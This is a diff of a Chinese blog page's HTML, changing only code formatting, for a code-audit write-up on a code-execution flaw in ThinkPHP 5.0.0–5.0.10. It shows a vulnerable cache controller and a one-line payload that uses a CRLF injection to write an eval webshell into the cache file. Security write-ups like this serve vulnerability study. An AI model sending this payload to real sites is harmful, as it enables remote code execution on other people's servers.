@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="漏洞环境漏洞影响版本: 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10 application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller; use think\Cache; class Index &amp;#123;     public funct">
+        <meta name="description" content="漏洞环境漏洞影响版本: 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10 application&#x2F;index&#x2F;controller&#x2F;Index.php 1234567891011&lt;?phpnamespace app\index\controller;use think\Cache;class Index&amp;#123;    publ">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ThinkPHP5代码审计:代码执行(一)">
 <meta property="og:url" content="http://example.com/2024/06/07/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%80/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="漏洞环境漏洞影响版本: 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10 application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller; use think\Cache; class Index &amp;#123;     public funct">
+<meta property="og:description" content="漏洞环境漏洞影响版本: 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10 application&#x2F;index&#x2F;controller&#x2F;Index.php 1234567891011&lt;?phpnamespace app\index\controller;use think\Cache;class Index&amp;#123;    publ">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815389.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815382.png">
@@ -315,20 +315,10 @@
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本: 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10</p>
 <p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
-<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Cache</span><span class="token punctuation">;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token class-name static-context">Cache</span><span class="token operator">::</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"get.username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Cache success'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Cache</span>::<span class="title function_ invoke__">set</span>(<span class="string">&quot;name&quot;</span>,<span class="title function_ invoke__">input</span>(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">?username&#x3D;p0l1st123%0d%0a@eval($_GET[_]);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=p0l1st123%0d%0a@eval($_GET[_]);//</span><br></pre></td></tr></table></figure></div>
 
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815389.png" alt="image-20240607183904083"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先跟进Cache类的set方法，其首先通过单例模式init方法，创建了一个类实例，该类由cache的配置项type决定，默认情况下值为File</p>
